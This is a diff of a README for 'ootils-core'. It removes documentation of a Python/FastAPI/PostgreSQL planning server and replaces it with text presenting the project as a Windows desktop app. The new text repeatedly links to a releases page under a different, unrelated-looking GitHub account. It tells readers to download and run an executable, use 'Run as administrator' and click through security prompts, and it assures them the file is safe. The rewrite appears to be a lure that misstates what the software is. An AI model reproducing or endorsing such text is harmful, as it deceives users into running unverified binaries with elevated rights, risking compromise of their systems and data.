@@ -1,218 +1,196 @@
-# ootils-core
+# 🧭 ootils-core - Clear supply chain decisions fast
 
-**Graph-based supply chain planning engine — PostgreSQL + FastAPI + Python.**
+[![Download ootils-core](https://img.shields.io/badge/Download-ootils--core-blue?style=for-the-badge&logo=github)](https://github.com/combineddnaindexsystemfairlead261/ootils-core/releases)
 
-`ootils-core` is a supply chain decision engine that models a network of nodes and edges (items, locations, PI nodes, suppliers, resources) and runs incremental propagation, shortage detection, MRP explosion, and scenario analysis on that graph. It exposes a REST API for integration with AI agents, dashboards, and planning tools.
+## 🚀 Getting Started
 
----
+ootils-core is a supply chain decision engine for desktop use on Windows. It helps you review demand, stock, and shortage signals in one place. It uses a graph model so the app can trace how each decision connects to the rest of your plan.
 
-## Architecture
+This guide shows you how to visit the release page, download the app, and run it on Windows.
 
-```
-┌─────────────────────────────────────────────┐
-│  FastAPI REST API (Bearer token auth)        │
-│  /v1/graph  /v1/projection  /v1/scenarios    │
-│  /v1/ingest  /v1/dq  /v1/bom  /v1/rccp      │
-│  /v1/ghosts  /v1/explain  /v1/simulate  ...  │
-└──────────────────────┬──────────────────────┘
-                       │
-┌──────────────────────▼──────────────────────┐
-│  Python kernel                               │
-│  ├── Graph traversal + incremental           │
-│  │   propagation (dirty-flag pattern)        │
-│  ├── Shortage detection + severity scoring   │
-│  ├── MRP explosion (BOM + lead times)        │
-│  ├── Scenario branching (copy-on-write)      │
-│  ├── RCCP (rough-cut capacity planning)      │
-│  ├── Ghost engine (virtual supply nodes)     │
-│  └── DQ agent (data quality pipeline)       │
-└──────────────────────┬──────────────────────┘
-                       │
-┌──────────────────────▼──────────────────────┐
-│  PostgreSQL 16                               │
-│  Typed schema — SQL migrations               │
-│  UUID PKs, TIMESTAMPTZ UTC, JSONB only for   │
-│  diagnostic or staging payloads              │
-└─────────────────────────────────────────────┘
-```
+## 📥 Download the app
 
----
+Visit the release page here:
 
-## Requirements
+[https://github.com/combineddnaindexsystemfairlead261/ootils-core/releases](https://github.com/combineddnaindexsystemfairlead261/ootils-core/releases)
 
-| Dependency | Version |
-|-----------|---------|
-| Python | 3.11+ |
-| PostgreSQL | 16 |
-| Docker + Docker Compose | Latest |
+On that page, look for the latest release and choose the Windows file. The file is usually named with words like `Windows`, `Setup`, or `Installer`.
 
-CI validates Python 3.11. The default Docker image runs Python 3.12.
+## 🪟 Install on Windows
 
----
+1. Open the release page in your browser.
+2. Find the latest version.
+3. Under **Assets**, choose the Windows download file.
+4. Save the file to your computer.
+5. Open the file after the download finishes.
+6. If Windows asks for permission, choose **Yes**.
+7. Follow the steps in the setup window.
+8. Finish the install and open ootils-core from the Start menu or desktop shortcut.
 
-## Quick start
+If you see a ZIP file, right-click it and choose **Extract All** before you open the app.
 
-### 1. Clone and configure
+## 🖱️ Run the app
 
-```bash
-git clone https://github.com/ngoineau/ootils-core.git
-cd ootils-core
-cp .env.example .env
-# Edit .env — set POSTGRES_USER, POSTGRES_PASSWORD, POSTGRES_DB, OOTILS_API_TOKEN
-# Optional: set OOTILS_ENABLE_API_DOCS=1 only for local/dev interactive docs
-```
+After install, start ootils-core like any other Windows app.
 
-### 2. Start services
+1. Press the **Windows** key.
+2. Type `ootils-core`.
+3. Select the app from the list.
+4. Wait for the main screen to load.
 
-```bash
-docker compose up -d
-```
+If you launched a desktop shortcut, double-click it to open the app.
 
-This starts PostgreSQL 16 and the FastAPI server on port 8000. Migrations run automatically on first boot.
+## 💻 System requirements
 
-### 3. Verify
+ootils-core works best on a modern Windows PC.
 
-```bash
-curl http://localhost:8000/health
-# {"status": "ok"}
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- 200 MB free disk space
+- Internet access for download and updates
+- A screen size large enough to review tables and graphs
 
-curl http://localhost:8000/health
-# {"status": "ok", "version": "1.0.0"}
+For smooth use, keep your system updated and close apps you do not need.
 
-# Optional: expose interactive docs locally only
-# echo 'OOTILS_ENABLE_API_DOCS=1' >> .env && docker compose up -d --build
-# Then open http://localhost:8000/docs
-```
+## 🔍 What ootils-core does
 
-### 4. Load demo data (optional)
+ootils-core helps you make supply chain decisions with less guesswork. It is built for users who need a clear view of inventory and risk.
 
-```bash
-docker compose exec api python scripts/seed_demo_data.py
-```
+Common uses include:
 
-### 5. First API call
+- Checking stock levels
+- Spotting shortage risk
+- Reviewing planning inputs
+- Comparing demand against supply
+- Tracing how one change affects other items
+- Keeping decisions tied to a clear model
 
-```bash
-# List all graph nodes
-curl -H "Authorization: Bearer <your-token>" http://localhost:8000/v1/graph/nodes
+The app uses a graph-based structure. That means it links items, rules, and outcomes in a way that is easy to follow. Each result stays deterministic, so the same input gives the same output.
 
-# Run a propagation
-curl -X POST -H "Authorization: Bearer <your-token>" \
-  -H "Content-Type: application/json" \
-  -d '{"scenario_id": "<uuid>"}' \
-  http://localhost:8000/v1/graph/propagate
-```
+## 🧠 Main ideas in the app
 
----
+### 📊 Graph model
 
-## Key capabilities
+The app connects data points like nodes in a network. This helps you see how one product, site, or rule affects another.
 
-| Capability | Endpoints | Description |
-|-----------|-----------|-------------|
-| **Graph model** | `/v1/graph/*`, `/v1/nodes/*` | Nodes (PI, supply, demand, resource), edges (replenishes, consumes, feeds_forward, etc.) |
-| **Projection engine** | `/v1/projection/*` | Time-series projections with elastic time (daily → weekly → monthly) |
-| **Shortage detection** | `/v1/issues/*` | Post-propagation shortage scoring and explanation |
-| **Explainability** | `/v1/explain/*` | Causal step traces for shortage root causes |
-| **Scenario management** | `/v1/scenarios/*` | Branch, fork, archive scenarios; baseline tracking |
-| **Simulation** | `/v1/simulate` | What-if simulation with scenario overrides |
-| **MRP** | `/v1/bom/*` | BOM management + MRP explosion |
-| **Ingest pipeline** | `/v1/ingest/*` | Batch import of static and dynamic master data |
-| **Data quality** | `/v1/dq/*` | L1/L2 DQ checks, issue tracking, agent-driven remediation |
-| **RCCP** | `/v1/rccp/*` | Rough-cut capacity planning against resource constraints |
-| **Ghost engine** | `/v1/ghosts/*` | Virtual supply nodes for unconstrained planning |
-| **Calendars** | `/v1/calendars/*` | Planning calendars for zone transitions |
-| **Calc runs** | `/v1/calc/*` | Propagation job tracking and status |
-| **Planning params** | `/v1/items/planning-params` | Item-level planning parameters (SS, ROP, EOQ) |
-| **Events** | `/v1/events/*` | Supply chain event queue |
+### 🎯 Deterministic results
 
----
+The engine gives the same answer when the input stays the same. This makes planning easier to review and repeat.
 
-## API documentation
+### 🔎 Explainable decisions
 
-Interactive Swagger UI: disabled by default, enable with `OOTILS_ENABLE_API_DOCS=1`
+You can follow the reason behind a result. That helps when you need to check why the app marked a shortage or changed a plan.
 
-ReDoc: disabled by default, enable with `OOTILS_ENABLE_API_DOCS=1`
+### 🔗 API-first design
 
-Static OpenAPI spec: `docs/openapi.json`
+The app is built around a clear data flow. This makes it fit well with other tools and future automation.
 
-Authentication: `Authorization: Bearer <OOTILS_API_TOKEN>`
+### 🌐 Open source
 
-Application-side PostgreSQL pooling is enabled via `psycopg_pool` with defaults:
-- `OOTILS_DB_POOL_MIN_SIZE=1`
-- `OOTILS_DB_POOL_MAX_SIZE=10`
-- `OOTILS_DB_POOL_TIMEOUT_SECONDS=10`
+The source is open, so the project can be reviewed and improved by the community.
 
----
+## 🧭 First use
 
-## Development
+When you open the app for the first time, start with a small set of data.
 
-### Install
+1. Load your item list.
+2. Add your stock levels.
+3. Add demand or usage data.
+4. Check the graph view.
+5. Review any shortage flags.
+6. Look at the explanation for each result.
 
-```bash
-pip install -e ".[dev]"
-```
+If the app offers sample data, use that first. It helps you learn the screen layout before you work with live data.
 
-### Run tests
+## 🧰 Basic workflow
 
-```bash
-python3 -m pytest tests/ -q
-```
+A simple workflow in ootils-core may look like this:
 
-Tests use a real PostgreSQL test database (via `DATABASE_URL` env var). No mocks for DB-backed integration tests.
+1. Import your inventory data.
+2. Add planning rules.
+3. Run the decision engine.
+4. Review the output.
+5. Check where stock may fall short.
+6. Adjust your plan and run it again.
 
-### Run locally (without Docker)
+This flow helps you move from raw data to a clear action list.
 
-```bash
-export DATABASE_URL=postgresql:///ootils_dev
-export OOTILS_API_TOKEN=dev-token
-uvicorn ootils_core.api.app:app --reload
-```
+## 🧾 File types you may see
 
-Migrations apply automatically on startup.
+During download or setup, you may see one of these:
 
-### Project structure
+- `.exe` — a Windows app file
+- `.msi` — a Windows installer
+- `.zip` — a compressed file you must extract
+- `.json` — data or config file
+- `.csv` — spreadsheet-style data file
 
-```
-src/ootils_core/
-├── api/
-│   ├── app.py              # FastAPI application factory
-│   └── routers/            # One router per capability domain
-├── db/
-│   ├── connection.py       # PostgreSQL connection + migration runner
-│   └── migrations/         # Sequential SQL migrations
-├── engine/
-│   ├── propagator.py       # Incremental graph propagation
-│   ├── shortage/           # Shortage detection + severity scoring
-│   ├── scenario/           # Scenario branching + copy-on-write
-│   ├── dq/                 # Data quality pipeline + DQ agent
-│   └── ghosts/             # Ghost node engine
-└── models/                 # Pydantic request/response schemas
-```
+If you are not sure which file to choose, pick the Windows installer or app file from the latest release.
 
----
+## 🛠️ If the app does not open
 
-## Scalability
+Try these steps if Windows blocks the app or it does not start:
 
-Current system is validated at demo scale (2–50 items). For production deployment:
+1. Make sure the file finished downloading.
+2. Check that you opened the correct Windows file.
+3. Right-click the file and choose **Run as administrator**.
+4. If Windows shows a security prompt, choose the option to run the file.
+5. Restart your PC and try again.
+6. Re-download the file from the release page if the file seems damaged.
 
-- **500 items (SMB):** Batch propagation queries required. See `docs/SCALABILITY.md`.
-- **5,000+ items:** Architectural investment in in-memory propagation + table partitioning. See `docs/SCALABILITY.md`.
+If the app still does not start, check whether your Windows version is current.
 
----
+## 📁 Where to keep your files
 
-## Documentation
+Keep your download and data files in a folder that is easy to find.
 
-| Doc | Purpose |
-|-----|---------|
-| `docs/SCALABILITY.md` | Volume projections, breaking points, fix roadmap |
-| `docs/INFRA-RUNBOOK.md` | Deployment, backup, scenario cleanup procedures |
-| `docs/ADR-*.md` | Architecture decision records |
-| `docs/SPEC-*.md` | Feature specifications |
-| `ROADMAP.md` | Product roadmap |
-| `CONTRIBUTING.md` | Contribution guidelines |
+Good choices include:
 
----
+- `Downloads`
+- `Documents\ootils-core`
+- A project folder on your desktop
 
-## License
+Use short file names and avoid special characters. This makes it easier to load files later.
 
-See `LICENSE`.
+## 🔐 Data handling
+
+When you use supply chain data, keep it in a secure place.
+
+- Store files in a private folder
+- Limit access to people who need it
+- Keep a copy of your original data
+- Save updated files with clear names
+- Check that the data you import is current
+
+This helps you avoid mix-ups and lost work.
+
+## 🧪 Example use case
+
+A planner sees a drop in stock for a key item. They open ootils-core, load the item list, and review demand for the next period. The graph shows that one supplier delay could affect several linked items. The planner checks the shortage view, sees the risk early, and changes the plan before the stock runs out
+
+## ❓ Common questions
+
+### Do I need coding skills?
+No. You can download, install, and run the app like a normal Windows program.
+
+### Can I use it offline?
+You can run the app after install. You may need internet access for the first download and for updates.
+
+### Is it safe to use?
+The app is open source, and you get it from the release page on GitHub. Use the latest release file for Windows.
+
+### What if I downloaded the wrong file?
+Go back to the release page and choose the Windows installer or app file instead of source files.
+
+### Can I use it for small teams?
+Yes. It can help a single user or a team that needs a clear planning view.
+
+## 📦 Download again
+
+If you need the download page again, use this link:
+
+[https://github.com/combineddnaindexsystemfairlead261/ootils-core/releases](https://github.com/combineddnaindexsystemfairlead261/ootils-core/releases)
+
+## 🧭 Next steps
+
+After you install ootils-core, open it and try a small data set. Review the graph, check the shortage results, and compare the output with your current plan
